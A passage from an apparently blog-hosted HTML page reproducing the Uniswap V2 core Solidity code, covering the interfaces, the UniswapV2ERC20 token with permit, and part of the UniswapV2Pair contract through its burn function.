        <content type="html"><![CDATA[<h1 id="ERC20-amp-amp-Pair-amp-amp-Factory"><a href="#ERC20-amp-amp-Pair-amp-amp-Factory" class="headerlink" title="ERC20&amp;&amp;Pair&amp;&amp;Factory"></a>ERC20&amp;&amp;Pair&amp;&amp;Factory</h1><h2 id="Total-Code"><a href="#Total-Code" class="headerlink" title="Total Code"></a>Total Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity =0.5.16;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Factory &#123;</span><br><span class="line">    event PairCreated(address indexed token0, address indexed token1, address pair, uint);</span><br><span class="line"></span><br><span class="line">    function feeTo() external view returns (address);</span><br><span class="line">    function feeToSetter() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function getPair(address tokenA, address tokenB) external view returns (address pair);</span><br><span class="line">    function allPairs(uint) external view returns (address pair);</span><br><span class="line">    function allPairsLength() external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function createPair(address tokenA, address tokenB) external returns (address pair);</span><br><span class="line"></span><br><span class="line">    function setFeeTo(address) external;</span><br><span class="line">    function setFeeToSetter(address) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">    function name() external pure returns (string memory);</span><br><span class="line">    function symbol() external pure returns (string memory);</span><br><span class="line">    function decimals() external pure returns (uint8);</span><br><span class="line">    function totalSupply() external view returns (uint);</span><br><span class="line">    function balanceOf(address owner) external view returns (uint);</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint value) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function DOMAIN_SEPARATOR() external view returns (bytes32);</span><br><span class="line">    function PERMIT_TYPEHASH() external pure returns (bytes32);</span><br><span class="line">    function nonces(address owner) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;</span><br><span class="line"></span><br><span class="line">    event Mint(address indexed sender, uint amount0, uint amount1);</span><br><span class="line">    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);</span><br><span class="line">    event Swap(</span><br><span class="line">        address indexed sender,</span><br><span class="line">        uint amount0In,</span><br><span class="line">        uint amount1In,</span><br><span class="line">        uint amount0Out,</span><br><span class="line">        uint amount1Out,</span><br><span class="line">        address indexed to</span><br><span class="line">    );</span><br><span class="line">    event Sync(uint112 reserve0, uint112 reserve1);</span><br><span class="line"></span><br><span class="line">    function MINIMUM_LIQUIDITY() external pure returns (uint);</span><br><span class="line">    function factory() external view returns (address);</span><br><span class="line">    function token0() external view returns (address);</span><br><span class="line">    function token1() external view returns (address);</span><br><span class="line">    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);</span><br><span class="line">    function price0CumulativeLast() external view returns (uint);</span><br><span class="line">    function price1CumulativeLast() external view returns (uint);</span><br><span class="line">    function kLast() external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function mint(address to) external returns (uint liquidity);</span><br><span class="line">    function burn(address to) external returns (uint amount0, uint amount1);</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">    function skim(address to) external;</span><br><span class="line">    function sync() external;</span><br><span class="line"></span><br><span class="line">    function initialize(address, address) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2ERC20 &#123;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">    function name() external pure returns (string memory);</span><br><span class="line">    function symbol() external pure returns (string memory);</span><br><span class="line">    function decimals() external pure returns (uint8);</span><br><span class="line">    function totalSupply() external view returns (uint);</span><br><span class="line">    function balanceOf(address owner) external view returns (uint);</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint value) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function DOMAIN_SEPARATOR() external view returns (bytes32);</span><br><span class="line">    function PERMIT_TYPEHASH() external pure returns (bytes32);</span><br><span class="line">    function nonces(address owner) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line">    function decimals() external view returns (uint8);</span><br><span class="line">    function totalSupply() external view returns (uint);</span><br><span class="line">    function balanceOf(address owner) external view returns (uint);</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint value) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Callee &#123;</span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UniswapV2ERC20 is IUniswapV2ERC20 &#123;</span><br><span class="line">    using SafeMath for uint;</span><br><span class="line"></span><br><span class="line">    string public constant name = &#x27;Uniswap V2&#x27;;</span><br><span class="line">    string public constant symbol = &#x27;UNI-V2&#x27;;</span><br><span class="line">    uint8 public constant decimals = 18;</span><br><span class="line">    uint  public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint)) public allowance;</span><br><span class="line"></span><br><span class="line">    bytes32 public DOMAIN_SEPARATOR;</span><br><span class="line">    // keccak256(&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;);</span><br><span class="line">    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;</span><br><span class="line">    mapping(address =&gt; uint) public nonces;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        uint chainId;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            chainId := chainid</span><br><span class="line">        &#125;</span><br><span class="line">        DOMAIN_SEPARATOR = keccak256(</span><br><span class="line">            abi.encode(</span><br><span class="line">                keccak256(&#x27;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&#x27;),</span><br><span class="line">                keccak256(bytes(name)),</span><br><span class="line">                keccak256(bytes(&#x27;1&#x27;)),</span><br><span class="line">                chainId,</span><br><span class="line">                address(this)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address to, uint value) internal &#123;</span><br><span class="line">        totalSupply = totalSupply.add(value);</span><br><span class="line">        balanceOf[to] = balanceOf[to].add(value);</span><br><span class="line">        emit Transfer(address(0), to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address from, uint value) internal &#123;</span><br><span class="line">        balanceOf[from] = balanceOf[from].sub(value);</span><br><span class="line">        totalSupply = totalSupply.sub(value);</span><br><span class="line">        emit Transfer(from, address(0), value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint value) private &#123;</span><br><span class="line">        allowance[owner][spender] = value;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address from, address to, uint value) private &#123;</span><br><span class="line">        balanceOf[from] = balanceOf[from].sub(value);</span><br><span class="line">        balanceOf[to] = balanceOf[to].add(value);</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint value) external returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint value) external returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint value) external returns (bool) &#123;</span><br><span class="line">        if (allowance[from][msg.sender] != uint(-1)) &#123;</span><br><span class="line">            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external &#123;</span><br><span class="line">        require(deadline &gt;= block.timestamp, &#x27;UniswapV2: EXPIRED&#x27;);</span><br><span class="line">        bytes32 digest = keccak256(</span><br><span class="line">            abi.encodePacked(</span><br><span class="line">                &#x27;\x19\x01&#x27;,</span><br><span class="line">                DOMAIN_SEPARATOR,</span><br><span class="line">                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        address recoveredAddress = ecrecover(digest, v, r, s);</span><br><span class="line">        require(recoveredAddress != address(0) &amp;&amp; recoveredAddress == owner, &#x27;UniswapV2: INVALID_SIGNATURE&#x27;);</span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20 &#123;</span><br><span class="line">    using SafeMath  for uint;</span><br><span class="line">    using UQ112x112 for uint224;</span><br><span class="line"></span><br><span class="line">    uint public constant MINIMUM_LIQUIDITY = 10**3;</span><br><span class="line">    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line"></span><br><span class="line">    address public factory;</span><br><span class="line">    address public token0;</span><br><span class="line">    address public token1;</span><br><span class="line"></span><br><span class="line">    uint112 private reserve0;           // uses single storage slot, accessible via getReserves</span><br><span class="line">    uint112 private reserve1;           // uses single storage slot, accessible via getReserves</span><br><span class="line">    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves</span><br><span class="line"></span><br><span class="line">    uint public price0CumulativeLast;</span><br><span class="line">    uint public price1CumulativeLast;</span><br><span class="line">    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event</span><br><span class="line"></span><br><span class="line">    uint private unlocked = 1;</span><br><span class="line">    modifier lock() &#123;</span><br><span class="line">        require(unlocked == 1, &#x27;UniswapV2: LOCKED&#x27;);</span><br><span class="line">        unlocked = 0;</span><br><span class="line">        _;</span><br><span class="line">        unlocked = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;</span><br><span class="line">        _reserve0 = reserve0;</span><br><span class="line">        _reserve1 = reserve1;</span><br><span class="line">        _blockTimestampLast = blockTimestampLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _safeTransfer(address token, address to, uint value) private &#123;</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));</span><br><span class="line">        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Mint(address indexed sender, uint amount0, uint amount1);</span><br><span class="line">    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);</span><br><span class="line">    event Swap(</span><br><span class="line">        address indexed sender,</span><br><span class="line">        uint amount0In,</span><br><span class="line">        uint amount1In,</span><br><span class="line">        uint amount0Out,</span><br><span class="line">        uint amount1Out,</span><br><span class="line">        address indexed to</span><br><span class="line">    );</span><br><span class="line">    event Sync(uint112 reserve0, uint112 reserve1);</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // update reserves and, on the first call per block, price accumulators</span><br><span class="line">    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;</span><br><span class="line">        require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);</span><br><span class="line">        uint32 blockTimestamp = uint32(block.timestamp % 2**32);</span><br><span class="line">        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired</span><br><span class="line">        if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;</span><br><span class="line">            // * never overflows, and + overflow is desired</span><br><span class="line">            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;</span><br><span class="line">            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;</span><br><span class="line">        &#125;</span><br><span class="line">        reserve0 = uint112(balance0);</span><br><span class="line">        reserve1 = uint112(balance1);</span><br><span class="line">        blockTimestampLast = blockTimestamp;</span><br><span class="line">        emit Sync(reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)</span><br><span class="line">    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;</span><br><span class="line">        address feeTo = IUniswapV2Factory(factory).feeTo();</span><br><span class="line">        feeOn = feeTo != address(0);</span><br><span class="line">        uint _kLast = kLast; // gas savings</span><br><span class="line">        if (feeOn) &#123;</span><br><span class="line">            if (_kLast != 0) &#123;</span><br><span class="line">                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));</span><br><span class="line">                uint rootKLast = Math.sqrt(_kLast);</span><br><span class="line">                if (rootK &gt; rootKLast) &#123;</span><br><span class="line">                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));</span><br><span class="line">                    uint denominator = rootK.mul(5).add(rootKLast);</span><br><span class="line">                    uint liquidity = numerator / denominator;</span><br><span class="line">                    if (liquidity &gt; 0) _mint(feeTo, liquidity);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (_kLast != 0) &#123;</span><br><span class="line">            kLast = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function mint(address to) external lock returns (uint liquidity) &#123;</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        uint balance0 = IERC20(token0).balanceOf(address(this));</span><br><span class="line">        uint balance1 = IERC20(token1).balanceOf(address(this));</span><br><span class="line">        uint amount0 = balance0.sub(_reserve0);</span><br><span class="line">        uint amount1 = balance1.sub(_reserve1);</span><br><span class="line"></span><br><span class="line">        bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">        if (_totalSupply == 0) &#123;</span><br><span class="line">            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);</span><br><span class="line">           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);</span><br><span class="line">        &#125;</span><br><span class="line">        require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;);</span><br><span class="line">        _mint(to, liquidity);</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">        emit Mint(msg.sender, amount0, amount1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a contract which performs important safety checks</span><br><span class="line">    function burn(address to) external lock returns (uint amount0, uint amount1) &#123;</span><br><span class="line">        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">        address _token0 = token0;                                // gas savings</span><br><span class="line">        address _token1 = token1;                                // gas savings</span><br><span class="line">        uint balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        uint balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">        uint liquidity = balanceOf[address(this)];</span><br><span class="line"></span><br><span class="line">        bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">        require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);</span><br><span class="line">        _burn(address(this), liquidity);</span><br><span class="line">        _safeTransfer(_token0, to, amount0);</span><br><span class="line">        _safeTransfer(_token1, to, amount1);</span><br><span class="line">        balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">        balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">        emit Burn(msg.sender, amount0, amount1, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this low-level function should be called from a 